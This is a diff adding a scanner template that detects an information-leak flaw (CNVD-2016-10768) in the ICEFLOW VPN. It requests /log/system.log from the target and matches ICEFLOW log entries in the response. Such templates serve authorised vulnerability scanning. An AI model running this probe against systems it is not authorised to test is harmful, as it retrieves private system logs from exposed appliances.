@@ -1,0 +1,25 @@
+id: poc-yaml-iceflow-vpn-cnvd-2016-10768-info-leak
+
+info:
+  name: poc-yaml-iceflow-vpn-cnvd-2016-10768-info-leak
+  author: Aurora
+  severity: medium
+  tags: xray-converted,exposure,cnvd-2016-10768,ct-456724
+  reference:
+    - https://vulners.com/seebug/SSV:90548
+
+http:
+  - raw:
+      - |
+        GET /log/system.log HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "\\d{4}/\\d{2}/\\d{2}\\s+\\d{2}:\\d{2}:\\d{2}\\s+ICEFLOW\\s+(.*):(.*)\n"
